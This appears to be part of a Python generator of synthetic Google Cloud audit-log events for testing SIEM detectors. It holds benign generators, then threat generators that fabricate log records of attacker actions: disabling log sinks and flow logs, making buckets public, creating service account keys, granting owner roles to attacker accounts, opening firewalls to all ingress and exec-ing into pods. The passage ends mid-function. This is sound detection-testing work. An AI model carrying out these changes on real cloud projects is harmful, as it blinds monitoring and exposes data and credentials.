def _gen_compute_get_instance(config, context=None):
    """Benign: Get a specific GCE instance (data access)."""
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region = _random_region(config)
    zone = _random_zone(region)
    instance = _get_random_gce_instance(config)
    instance_id = str(random.randint(1000000000000000, 9999999999999999))

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "compute.googleapis.com",
        method_name     = "v1.compute.instances.get",
        resource_name   = f"projects/{project_id}/zones/{zone}/instances/{instance}",
        resource_type   = "gce_instance",
        resource_labels = {"zone": zone, "instance_id": instance_id},
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {"project": project_id, "zone": zone, "instance": instance},
    )
    return [entry]


def _gen_iam_get_policy(config, context=None):
    """Benign: GetIamPolicy on a project."""
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "cloudresourcemanager.googleapis.com",
        method_name     = "GetIamPolicy",
        resource_name   = f"projects/{project_id}",
        resource_type   = "project",
        resource_labels = {},
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {"resource": f"projects/{project_id}", "options": {}},
    )
    return [entry]


def _gen_iam_list_service_accounts(config, context=None):
    """Benign: List service accounts in the project."""
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "iam.googleapis.com",
        method_name     = "google.iam.admin.v1.ListServiceAccounts",
        resource_name   = f"projects/{project_id}",
        resource_type   = "project",
        resource_labels = {},
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {"name": f"projects/{project_id}", "pageSize": 100},
    )
    return [entry]


def _gen_bigquery_list_datasets(config, context=None):
    """Benign: List BigQuery datasets."""
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region = _random_region(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "bigquery.googleapis.com",
        method_name     = "google.cloud.bigquery.v2.DatasetService.ListDatasets",
        resource_name   = f"projects/{project_id}",
        resource_type   = "bigquery_project",
        resource_labels = {"project_id": project_id, "location": region},
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {"projectId": project_id, "maxResults": 50},
    )
    return [entry]


def _gen_bigquery_run_query(config, context=None):
    """Benign: Run a BigQuery query job."""
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region = _random_region(config)
    dataset = _get_random_bq_dataset(config)
    table = random.choice(["events", "sessions", "transactions", "users", "metrics"])
    job_id = f"bqjob_{uuid.uuid4().hex[:16]}"

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "bigquery.googleapis.com",
        method_name     = "google.cloud.bigquery.v2.JobService.InsertJob",
        resource_name   = f"projects/{project_id}/jobs/{job_id}",
        resource_type   = "bigquery_project",
        resource_labels = {"project_id": project_id, "location": region},
        log_type        = _LOG_ACTIVITY,
        request_body    = {
            "projectId": project_id,
            "job": {
                "jobReference": {"projectId": project_id, "jobId": job_id},
                "configuration": {
                    "query": {
                        "query": f"SELECT * FROM `{project_id}.{dataset}.{table}` LIMIT {random.randint(100, 10000)}",
                        "useLegacySql": False,
                    }
                }
            }
        },
    )
    return [entry]


def _gen_gke_list_clusters(config, context=None):
    """Benign: List GKE clusters."""
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region = _random_region(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "container.googleapis.com",
        method_name     = "google.container.v1.ClusterManager.ListClusters",
        resource_name   = f"projects/{project_id}/locations/{region}",
        resource_type   = "k8s_cluster",
        resource_labels = {"location": region, "cluster_name": ""},
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {"parent": f"projects/{project_id}/locations/{region}"},
    )
    return [entry]


def _gen_cloudrun_list_services(config, context=None):
    """Benign: List Cloud Run services.

    50% of the time uses the Cloud Run default SA (developer.gserviceaccount.com)
    so XSIAM builds a correlation model linking that SA to cloud_run_revision
    resources — enabling the CLI_FROM_SERVERLESS detector to fire.
    """
    project_id = _get_project_id(config)
    if random.random() < 0.5:
        principal_email = _get_serverless_sa(config)
        caller_ip = _get_serverless_internal_ip()
    else:
        p = _get_random_principal(config, context)
        principal_email = p['email']
        caller_ip = p['caller_ip']
    region = _random_region(config)
    service = _get_random_cloud_run_service(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = principal_email,
        caller_ip       = caller_ip,
        service_name    = "run.googleapis.com",
        method_name     = "google.cloud.run.v2.Services.ListServices",
        resource_name   = f"projects/{project_id}/locations/{region}",
        resource_type   = "cloud_run_revision",
        resource_labels = {
            "location": region,
            "service_name": service,
            "revision_name": f"{service}-00001-{uuid.uuid4().hex[:3]}",
            "configuration_name": service,
        },
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {"parent": f"projects/{project_id}/locations/{region}"},
    )
    return [entry]


def _gen_pubsub_list_topics(config, context=None):
    """Benign: List Pub/Sub topics."""
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "pubsub.googleapis.com",
        method_name     = "google.pubsub.v1.Publisher.ListTopics",
        resource_name   = f"projects/{project_id}",
        resource_type   = "pubsub_topic",
        resource_labels = {"project_id": project_id, "topic_id": ""},
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {"project": f"projects/{project_id}", "pageSize": 100},
    )
    return [entry]


def _gen_secret_access(config, context=None):
    """Benign: Access a non-sensitive secret version."""
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    secret_id = _get_random_secret_id(config, sensitive=False)
    version = str(random.randint(1, 5))

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "secretmanager.googleapis.com",
        method_name     = "google.cloud.secretmanager.v1.SecretManagerService.AccessSecretVersion",
        resource_name   = f"{secret_id}/versions/{version}",
        resource_type   = "audited_resource",
        resource_labels = {"service": "secretmanager.googleapis.com", "method": "google.cloud.secretmanager.v1.SecretManagerService.AccessSecretVersion"},
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {"name": f"{secret_id}/versions/{version}"},
    )
    return [entry]


def _gen_logging_list_sinks(config, context=None):
    """Benign: List Cloud Logging export sinks."""
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "logging.googleapis.com",
        method_name     = "google.logging.v2.ConfigServiceV2.ListSinks",
        resource_name   = f"projects/{project_id}",
        resource_type   = "project",
        resource_labels = {"project_id": project_id},
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {"parent": f"projects/{project_id}", "pageSize": 100},
    )
    return [entry]


def _gen_monitoring_list_metrics(config, context=None):
    """Benign: List Cloud Monitoring time series."""
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)

    metric_type = random.choice([
        "compute.googleapis.com/instance/cpu/utilization",
        "storage.googleapis.com/api/request_count",
        "cloudsql.googleapis.com/database/cpu/utilization",
    ])

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "monitoring.googleapis.com",
        method_name     = "google.monitoring.v3.MetricService.ListTimeSeries",
        resource_name   = f"projects/{project_id}",
        resource_type   = "project",
        resource_labels = {},
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {
            "name":   f"projects/{project_id}",
            "filter": f'metric.type = "{metric_type}"',
        },
    )
    return [entry]


def _gen_dns_list_zones(config, context=None):
    """Benign: List Cloud DNS managed zones."""
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "dns.googleapis.com",
        method_name     = "dns.managedZones.list",
        resource_name   = f"projects/{project_id}",
        resource_type   = "dns_managed_zone",
        resource_labels = {"location": "global"},
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {"project": project_id},
    )
    return [entry]


def _gen_vertex_list_models(config, context=None):
    """Benign: List Vertex AI models."""
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region = _random_region(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "aiplatform.googleapis.com",
        method_name     = "google.cloud.aiplatform.v1.ModelService.ListModels",
        resource_name   = f"projects/{project_id}/locations/{region}",
        resource_type   = "audited_resource",
        resource_labels = {"service": "aiplatform.googleapis.com", "method": "google.cloud.aiplatform.v1.ModelService.ListModels"},
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {"parent": f"projects/{project_id}/locations/{region}"},
    )
    return [entry]


def _gen_cloudfunctions_invoke(config, context=None):
    """Benign: Invoke a Cloud Function.

    50% of the time uses the Cloud Functions default SA (appspot/developer.gserviceaccount.com)
    so XSIAM builds a correlation model linking that SA to cloud_function resources.
    """
    project_id = _get_project_id(config)
    if random.random() < 0.5:
        principal_email = _get_serverless_sa(config)
        caller_ip = _get_serverless_internal_ip()
    else:
        p = _get_random_principal(config, context)
        principal_email = p['email']
        caller_ip = p['caller_ip']
    region = _random_region(config)
    fn_name = _get_random_cloud_function(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = principal_email,
        caller_ip       = caller_ip,
        service_name    = "cloudfunctions.googleapis.com",
        method_name     = "google.cloud.functions.v1.CloudFunctionsService.CallFunction",
        resource_name   = f"projects/{project_id}/locations/{region}/functions/{fn_name}",
        resource_type   = "cloud_function",
        resource_labels = {"region": region, "function_name": fn_name},
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {"name": f"projects/{project_id}/locations/{region}/functions/{fn_name}"},
    )
    return [entry]


def _gen_cloudsql_list_instances(config, context=None):
    """Benign: List Cloud SQL instances."""
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region = _random_region(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "sqladmin.googleapis.com",
        method_name     = "google.cloud.sql.v1.SqlInstancesService.List",
        resource_name   = f"projects/{project_id}/instances",
        resource_type   = "cloudsql_database",
        resource_labels = {"database_id": f"{project_id}:*", "region": region},
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {"project": project_id},
    )
    return [entry]


def _gen_cloudsql_connect(config, context=None):
    """Benign: Generate ephemeral cert to connect to Cloud SQL."""
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region = _random_region(config)
    instance = _get_random_sql_instance(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "sqladmin.googleapis.com",
        method_name     = "google.cloud.sql.v1.SqlConnectService.GenerateEphemeralCert",
        resource_name   = f"projects/{project_id}/instances/{instance}",
        resource_type   = "cloudsql_database",
        resource_labels = {"database_id": f"{project_id}:{instance}", "region": region},
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {"instance": instance, "project": project_id},
    )
    return [entry]


def _gen_kms_list_keyrings(config, context=None):
    """Benign: List KMS key rings in a region."""
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region = _random_region(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "cloudkms.googleapis.com",
        method_name     = "google.cloud.kms.v1.KeyManagementService.ListKeyRings",
        resource_name   = f"projects/{project_id}/locations/{region}",
        resource_type   = "cloudkms_keyring",
        resource_labels = {"location": region, "key_ring_id": ""},
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {"parent": f"projects/{project_id}/locations/{region}"},
    )
    return [entry]


def _gen_kms_encrypt(config, context=None):
    """Benign: Encrypt data using a KMS key (write/consuming — ACTIVITY log)."""
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region = _random_region(config)
    keyring = _get_random_kms_keyring(config)
    key_name = _get_random_kms_key(config, keyring)

    resource_name = f"projects/{project_id}/locations/{region}/keyRings/{keyring}/cryptoKeys/{key_name}"

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "cloudkms.googleapis.com",
        method_name     = "google.cloud.kms.v1.KeyManagementService.Encrypt",
        resource_name   = resource_name,
        resource_type   = "cloudkms_cryptokey",
        resource_labels = {"location": region, "key_ring_id": keyring, "crypto_key_id": key_name},
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {"name": resource_name, "plaintext": "<base64-encoded-data>"},
    )
    return [entry]


def _gen_artifact_registry_list_repos(config, context=None):
    """Benign: List Artifact Registry repositories."""
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region = _random_region(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "artifactregistry.googleapis.com",
        method_name     = "google.devtools.artifactregistry.v1.ArtifactRegistry.ListRepositories",
        resource_name   = f"projects/{project_id}/locations/{region}",
        resource_type   = "audited_resource",
        resource_labels = {"service": "artifactregistry.googleapis.com", "method": "google.devtools.artifactregistry.v1.ArtifactRegistry.ListRepositories"},
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {"parent": f"projects/{project_id}/locations/{region}"},
    )
    return [entry]


def _gen_cloudbuild_list_builds(config, context=None):
    """Benign: List Cloud Build builds."""
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "cloudbuild.googleapis.com",
        method_name     = "google.devtools.cloudbuild.v1.CloudBuild.ListBuilds",
        resource_name   = f"projects/{project_id}/builds",
        resource_type   = "project",
        resource_labels = {"project_id": project_id},
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {"projectId": project_id, "pageSize": 50},
    )
    return [entry]


def _gen_cloud_armor_list_policies(config, context=None):
    """Benign: List Cloud Armor security policies."""
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "compute.googleapis.com",
        method_name     = "v1.compute.securityPolicies.list",
        resource_name   = f"projects/{project_id}",
        resource_type   = "project",
        resource_labels = {},
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {"project": project_id},
    )
    return [entry]


def _gen_spanner_list_instances(config, context=None):
    """Benign: List Cloud Spanner instances."""
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region = _random_region(config)

    instance = _get_random_spanner_instance(config)
    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "spanner.googleapis.com",
        method_name     = "google.spanner.admin.instance.v1.InstanceAdmin.ListInstances",
        resource_name   = f"projects/{project_id}/instances",
        resource_type   = "spanner_instance",
        resource_labels = {"instance_id": instance, "project_id": project_id, "location": region},
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {"parent": f"projects/{project_id}"},
    )
    return [entry]


def _gen_dataflow_list_jobs(config, context=None):
    """Benign: List Dataflow jobs."""
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region = _random_region(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "dataflow.googleapis.com",
        method_name     = "google.dataflow.v1beta3.JobsV1Beta3.ListJobs",
        resource_name   = f"projects/{project_id}/locations/{region}/jobs",
        resource_type   = "dataflow_step",
        resource_labels = {"job_id": "", "step_id": "", "project_id": project_id, "region": region},
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {"projectId": project_id, "location": region},
    )
    return [entry]


def _gen_compute_list_images(config, context=None):
    """Benign: List Compute Engine disk images."""
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "compute.googleapis.com",
        method_name     = "v1.compute.images.list",
        resource_name   = f"projects/{project_id}",
        resource_type   = "project",
        resource_labels = {},
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {"project": project_id},
    )
    return [entry]


# ---------------------------------------------------------------------------
# Threat / Suspicious Event Generators
# ---------------------------------------------------------------------------

def _gen_disable_audit_logging(config, context=None):
    """
    THREAT: Delete or disable a Cloud Logging export sink — equivalent to
    stopping CloudTrail. Deprives SIEM of future audit data.
    Analogous to AWS STOP_CLOUDTRAIL.
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    sink_name = _get_random_log_sink(config)

    # 60% delete, 40% update to exclude audit logs
    if random.random() < 0.6:
        method_name = "google.logging.v2.ConfigServiceV2.DeleteSink"
        resource_name = f"projects/{project_id}/sinks/{sink_name}"
        request_body = {"sinkName": f"projects/{project_id}/sinks/{sink_name}"}
    else:
        method_name = "google.logging.v2.ConfigServiceV2.UpdateSink"
        resource_name = f"projects/{project_id}/sinks/{sink_name}"
        request_body = {
            "sinkName": f"projects/{project_id}/sinks/{sink_name}",
            "sink": {
                "name": sink_name,
                "filter": 'logName!~"cloudaudit.googleapis.com"',
                "disabled": True,
            },
        }

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "logging.googleapis.com",
        method_name     = method_name,
        resource_name   = resource_name,
        resource_type   = "project",
        resource_labels = {"project_id": project_id},
        log_type        = _LOG_ACTIVITY,
        request_body    = request_body,
    )
    return [entry]


def _gen_make_gcs_public(config, context=None):
    """
    THREAT: Set a GCS bucket IAM policy to allUsers — exposes data publicly.
    Analogous to AWS MAKE_S3_PUBLIC.
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    bucket = _get_random_gcs_bucket(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "storage.googleapis.com",
        # Real GCP Cloud Audit Log methodName for bucket IAM changes is "storage.setIamPolicy"
        # NOT "storage.buckets.setIamPolicy" (that is the REST API path, not the audit log field)
        method_name     = "storage.setIamPolicy",
        resource_name   = f"projects/_/buckets/{bucket}",
        resource_type   = "gcs_bucket",
        # Real gcs_bucket resource labels contain only bucket_name and project_id (no location)
        resource_labels = {"bucket_name": bucket},
        log_type        = _LOG_ACTIVITY,
        authorization_info = [
            {
                "resource":    f"projects/_/buckets/{bucket}",
                "permission":  "storage.buckets.setIamPolicy",
                "granted":     True,
                "resourceAttributes": {},
            }
        ],
        request_body = {
            "kind":    "storage#policy",
            "bindings": [
                {
                    "role":    "roles/storage.objectViewer",
                    "members": ["allUsers"],
                },
                {
                    "role":    "roles/storage.legacyBucketReader",
                    "members": ["allAuthenticatedUsers"],
                },
            ],
        },
        service_data = {
            "@type": "type.googleapis.com/google.iam.v1.logging.AuditData",
            "policyDelta": {
                "bindingDeltas": [
                    {"action": "ADD", "role": "roles/storage.objectViewer",      "member": "allUsers"},
                    {"action": "ADD", "role": "roles/storage.legacyBucketReader", "member": "allAuthenticatedUsers"},
                ],
            },
        },
    )
    return [entry]


def _gen_create_sa_key(config, context=None):
    """
    THREAT: Create a service account key — long-lived credential exfiltration.
    High-signal indicator of insider threat or compromised account.
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    sa_email = _get_random_sa_excluding(config, p['email'])
    key_id = ''.join(random.choices('abcdef0123456789', k=40))

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "iam.googleapis.com",
        method_name     = "google.iam.admin.v1.CreateServiceAccountKey",
        resource_name   = f"projects/{project_id}/serviceAccounts/{sa_email}/keys/{key_id}",
        resource_type   = "service_account",
        resource_labels = {"email_id": sa_email, "unique_id": str(random.randint(100000000000, 999999999999))},
        log_type        = _LOG_ACTIVITY,
        request_body    = {
            "name":        f"projects/{project_id}/serviceAccounts/{sa_email}",
            "privateKeyType": "TYPE_GOOGLE_CREDENTIALS_FILE",
            "keyAlgorithm": "KEY_ALG_RSA_2048",
        },
        response_body   = {
            "name":          f"projects/{project_id}/serviceAccounts/{sa_email}/keys/{key_id}",
            "keyAlgorithm":  "KEY_ALG_RSA_2048",
            "validAfterTime": _gcp_timestamp(),
        },
    )
    return [entry]


def _gen_delete_sa_key(config, context=None):
    """
    THREAT: Delete a service account key — disrupt operations or erase stolen-key evidence.

    Fires the XSIAM 'GCP IAM Service Account Key Deletion' detector.
    Single-event, single-field trigger: XSIAM looks for any successful
    google.iam.admin.v1.DeleteServiceAccountKey in the activity log.

    Key structural differences from CreateServiceAccountKey:
      - methodName is DeleteServiceAccountKey (not Create)
      - request.name must include the KEY path (Delete requires specifying which key)
      - response body is absent — Delete returns google.protobuf.Empty
      - logName stays in cloudaudit.googleapis.com/activity (Admin Activity, same as Create)
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    sa_email   = _get_random_sa_excluding(config, p['email'])
    # Key ID is a 40-hex-char string — same format as GCP-issued SA key IDs
    key_id     = ''.join(random.choices('abcdef0123456789', k=40))
    unique_id  = str(random.randint(100000000000000000000, 999999999999999999999))

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "iam.googleapis.com",
        method_name     = "google.iam.admin.v1.DeleteServiceAccountKey",
        # resourceName at the key level — what is being deleted
        resource_name   = f"projects/-/serviceAccounts/{unique_id}/keys/{key_id}",
        resource_type   = "service_account",
        resource_labels = {
            "email_id":  sa_email,
            "unique_id": unique_id,
        },
        log_type        = _LOG_ACTIVITY,
        authorization_info = [
            {
                "resource":   f"projects/{project_id}/serviceAccounts/{sa_email}",
                "permission": "iam.serviceAccountKeys.delete",
                "granted":    True,
                "resourceAttributes": {},
            }
        ],
        request_body    = {
            "@type": "type.googleapis.com/google.iam.admin.v1.DeleteServiceAccountKeyRequest",
            "name":  f"projects/{project_id}/serviceAccounts/{sa_email}/keys/{key_id}",
        },
        # No response_body — DeleteServiceAccountKey returns google.protobuf.Empty
    )
    return [entry]


def _gen_iam_privilege_escalation(config, context=None):
    """
    THREAT: SetIamPolicy granting roles/owner or roles/editor to a principal
    that should not have it — privilege escalation.
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    gcp_conf = config.get(CONFIG_KEY, {})

    # The principal being escalated (pick a service account or external email)
    attacker_member = random.choice([
        f"serviceAccount:{_get_random_sa(config)}",
        f"user:{random.choice(_ATTACKER_DOMAINS).split('.')[0]}@{random.choice(_ATTACKER_DOMAINS)}",
        f"serviceAccount:attacker-sa@{random.choice(_ATTACKER_DOMAINS).split('.')[0]}.iam.gserviceaccount.com",
    ])
    escalated_role = random.choice(["roles/owner", "roles/editor", "roles/iam.securityAdmin"])

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "cloudresourcemanager.googleapis.com",
        method_name     = "SetIamPolicy",
        resource_name   = f"projects/{project_id}",
        resource_type   = "project",
        resource_labels = {},
        log_type        = _LOG_ACTIVITY,
        authorization_info = [
            {
                "resource":   f"projects/{project_id}",
                "permission": "resourcemanager.projects.setIamPolicy",
                "granted":    True,
                "resourceAttributes": {},
            }
        ],
        request_body = {
            "resource": f"projects/{project_id}",
            "policy": {
                "bindings": [
                    {
                        "role":    escalated_role,
                        "members": [attacker_member],
                    }
                ],
                "etag":    ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=20)),
                "version": 3,
            },
        },
        service_data = {
            "@type": "type.googleapis.com/google.iam.v1.logging.AuditData",
            "policyDelta": {
                "bindingDeltas": [
                    {"action": "ADD", "role": escalated_role, "member": attacker_member},
                ],
            },
        },
    )
    return [entry]


def _gen_tor_api_access(config, context=None):
    """
    THREAT: Any GCP API call originating from a known Tor exit node.
    Could be reconnaissance or data access masking the actor's origin.
    Analogous to AWS TOR_LOGIN.
    """
    project_id = _get_project_id(config)
    tor_ip = _get_tor_ip(config)
    region = _random_region(config)

    # Pick a random "victim" user email
    session_context = (context or {}).get('session_context')
    if session_context:
        from modules.session_utils import get_random_user
        u = get_random_user(session_context)
        email = (u.get('gcp_iam_user') or u.get('email')) if u else f"admin@{project_id}.iam.gserviceaccount.com"
    else:
        gcp_conf = config.get(CONFIG_KEY, {})
        sa_list = gcp_conf.get('service_accounts', [])
        email = random.choice(sa_list) if sa_list else f"admin@{project_id}.iam.gserviceaccount.com"

    # Pre-compute values used in multiple places in api_variants
    _tor_bucket = _get_random_gcs_bucket(config)
    _tor_zone = _random_zone(region)

    # Vary the API call (could be reconnaissance or actual access)
    api_variants = [
        ("cloudresourcemanager.googleapis.com", "GetIamPolicy", f"projects/{project_id}", "project", {}),
        ("storage.googleapis.com", "storage.objects.list", f"projects/_/buckets/{_tor_bucket}", "gcs_bucket", {"bucket_name": _tor_bucket, "location": region}),
        ("iam.googleapis.com", "google.iam.admin.v1.ListServiceAccounts", f"projects/{project_id}", "project", {}),
        ("compute.googleapis.com", "v1.compute.instances.list", f"projects/{project_id}/zones/{_tor_zone}", "gce_instance", {"zone": _tor_zone, "instance_id": ""}),
    ]
    svc, method, rname, rtype, rlabels = random.choice(api_variants)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = email,
        caller_ip       = tor_ip,
        service_name    = svc,
        method_name     = method,
        resource_name   = rname,
        resource_type   = rtype,
        resource_labels = rlabels,
    )
    return [entry]


def _gen_firewall_expose_all(config, context=None):
    """
    THREAT: Create a Compute Engine firewall rule allowing all ingress from 0.0.0.0/0.
    Exposes the VPC to the public internet — perimeter destruction.
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    network = _get_random_vpc_network(config)
    rule_name = f"allow-all-ingress-{''.join(random.choices('abcdef0123456789', k=6))}"
    firewall_rule_id = str(random.randint(100000000000000000, 999999999999999999))

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "compute.googleapis.com",
        method_name     = "v1.compute.firewalls.insert",
        resource_name   = f"projects/{project_id}/global/firewalls/{rule_name}",
        resource_type   = "gce_firewall_rule",
        resource_labels = {"firewall_rule_id": firewall_rule_id},
        log_type        = _LOG_ACTIVITY,
        request_body    = {
            "project": project_id,
            "firewall": {
                "name":        rule_name,
                "network":     f"projects/{project_id}/global/networks/{network}",
                "direction":   "INGRESS",
                "priority":    100,
                "sourceRanges": ["0.0.0.0/0"],
                "allowed": [
                    {"IPProtocol": "tcp"},
                    {"IPProtocol": "udp"},
                ],
                "description": "allow all ingress",
            },
        },
    )
    return [entry]


def _gen_disable_vpc_flow_logs(config, context=None):
    """
    THREAT: Patch a subnet to disable VPC flow logs — removes network visibility.
    Analogous to AWS DISABLE_S3_LOGGING.
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region = _random_region(config)
    subnet_name = random.choice(["default", "prod-subnet", "app-subnet", "internal-subnet"])

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "compute.googleapis.com",
        method_name     = "v1.compute.subnetworks.patch",
        resource_name   = f"projects/{project_id}/regions/{region}/subnetworks/{subnet_name}",
        resource_type   = "gce_subnetwork",
        resource_labels = {"subnetwork_name": subnet_name, "location": region, "subnetwork_id": str(random.randint(1000000000, 9999999999))},
        log_type        = _LOG_ACTIVITY,
        request_body    = {
            "project":    project_id,
            "region":     region,
            "subnetwork": subnet_name,
            "subnetworkResource": {
                "enableFlowLogs": False,
                "logConfig": {"enable": False},
            },
        },
    )
    return [entry]


def _gen_gke_exec_pod(config, context=None):
    """
    THREAT: container.pods.exec — interactive shell into a running container.
    High-signal lateral movement / persistence indicator in GKE environments.
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region = _random_region(config)
    cluster = _get_random_gke_cluster(config)
    namespace = random.choice(["default", "production", "kube-system", "monitoring"])
    pod_name = f"{random.choice(['web', 'api', 'worker', 'db'])}-{random.choice(['deployment', 'statefulset'])}-{''.join(random.choices('abcdef0123456789', k=8))}"
    container = random.choice(["app", "sidecar", "nginx", "envoy"])

    method = random.choice([
        "io.k8s.core.v1.pods.exec",
        "io.k8s.core.v1.pods.portforward",
    ])

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "container.googleapis.com",
        method_name     = method,
        resource_name   = f"projects/{project_id}/locations/{region}/clusters/{cluster}/k8s/namespaces/{namespace}/pods/{pod_name}",
        resource_type   = "k8s_cluster",
        resource_labels = {"location": region, "cluster_name": cluster, "project_id": project_id},
        log_type        = _LOG_ACTIVITY,
        authorization_info = [
            {
                "resource":   f"projects/{project_id}/locations/{region}/clusters/{cluster}",
                "permission": "container.pods.exec" if "exec" in method else "container.pods.portForward",
                "granted":    True,
                "resourceAttributes": {},
            }
        ],
        request_body = {
            "name":      pod_name,
            "namespace": namespace,
            "container": container,
            "command":   ["/bin/sh"],
            "stdin":     True,
            "tty":       True,
        },
    )
    return [entry]


def _gen_snapshot_exfil(config, context=None):
    """
    THREAT: Create a disk snapshot then share it with an external project —
    data exfiltration via persistent disk clone.
    Returns 2 events: createSnapshot + setIamPolicy.
    """
    p = _get_random_principal(config, context)
